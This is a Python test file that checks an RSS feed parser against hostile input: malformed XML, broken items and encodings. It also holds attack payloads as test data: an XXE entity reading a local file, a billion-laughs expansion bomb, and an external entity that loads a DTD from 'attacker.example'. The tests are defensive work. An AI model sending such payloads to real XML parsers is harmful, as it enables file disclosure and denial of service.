"""Hostile feed input.

Every byte parsed here arrives from a volunteer-run mirror we do not control. These
tests assert the parser cannot be made to crash, hang, exfiltrate, or exhaust memory.
"""
import time
import pytest
from tweet_relay.models import SourceUnavailable
from tweet_relay.sources.nitter_rss import parse_feed

H = "santtiagom_"


def feed(items: str, title: str = "santi / @santtiagom_") -> bytes:
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0"><channel><title>{title}</title>{items}</channel></rss>""".encode()


def item(id="123", author="santtiagom_", title="hello",
         date="Mon, 14 Sep 2026 21:31:35 GMT", desc=""):
    return (f"<item><title>{title}</title>"
            f"<link>https://nitter.example/{author}/status/{id}#m</link>"
            f"<guid>{id}</guid><pubDate>{date}</pubDate>"
            f"<description>{desc}</description></item>")


# ---------- entity attacks ----------

def test_xxe_external_entity_is_not_resolved(tmp_path):
    """The classic file-disclosure attack. defusedxml must refuse it outright."""
    secret = tmp_path / "secret.txt"
    secret.write_text("SENSITIVE-FILE-CONTENTS")
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE rss [<!ENTITY xxe SYSTEM "file://{secret}">]>
<rss version="2.0"><channel><title>santi / @santtiagom_</title>
{item(title="&xxe;")}</channel></rss>""".encode()
    with pytest.raises(SourceUnavailable):
        result = parse_feed(payload, H)
        assert not any("SENSITIVE" in t.text for t in result)


def test_billion_laughs_does_not_hang_or_exhaust_memory():
    """Entity expansion bomb: must fail fast, not consume the container."""
    entities = "".join(
        f'<!ENTITY lol{i} "&lol{i-1};&lol{i-1};&lol{i-1};&lol{i-1};">' for i in range(1, 10))
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE rss [<!ENTITY lol0 "haha">{entities}]>
<rss version="2.0"><channel><title>santi / @santtiagom_</title>
{item(title="&lol9;")}</channel></rss>""".encode()
    start = time.monotonic()
    with pytest.raises(SourceUnavailable):
        parse_feed(payload, H)
    assert time.monotonic() - start < 5, "expansion was attempted rather than refused"


def test_external_parameter_entity_is_refused():
    payload = b"""<?xml version="1.0"?>
<!DOCTYPE rss [<!ENTITY % ext SYSTEM "http://attacker.example/evil.dtd"> %ext;]>
<rss version="2.0"><channel><title>santi / @santtiagom_</title></channel></rss>"""
    with pytest.raises(SourceUnavailable):
        parse_feed(payload, H)


# ---------- malformed structure ----------

@pytest.mark.parametrize("payload", [
    b"",
    b"   ",
    b"not xml at all",
    b"<rss><channel><title>santi / @santtiagom_</title>",     # truncated
    b"<rss version='2.0'></rss>",                              # no channel
    b'{"json": "not xml"}',
    b"<html><body>Rate limit exceeded</body></html>",
    b"\x00\x01\x02\x03",
])
def test_malformed_feeds_raise_cleanly(payload):
    """FR-8: never a crash, never a non-SourceUnavailable exception."""
    with pytest.raises(SourceUnavailable):
        parse_feed(payload, H)


@pytest.mark.parametrize("bad_item", [
    "<item></item>",
    "<item><title>x</title></item>",                                   # no link
    "<item><title>x</title><link>not-a-url</link><guid>1</guid></item>",
    "<item><title>x</title><link>https://n/santtiagom_/status/1</link></item>",  # no date
])
def test_broken_items_are_dropped_not_fatal(bad_item):
    """A bad item must not cost us the good ones in the same feed."""
    tweets = parse_feed(feed(bad_item + item(id="777")), H)
    assert [t.id for t in tweets] == [777]


def test_utf16_feed_is_parsed_not_rejected():
    """Valid XML in a non-UTF-8 encoding is legitimate; the declaration governs."""
    payload = ('<?xml version="1.0" encoding="UTF-16"?>'
               '<rss version="2.0"><channel><title>santi / @santtiagom_</title>'
               '</channel></rss>').encode("utf-16")
    assert parse_feed(payload, H) == []


def test_feed_with_no_items_is_empty_not_an_error():
    """§7: an empty account is healthy, and must be distinguishable from a failure."""
    assert parse_feed(feed(""), H) == []
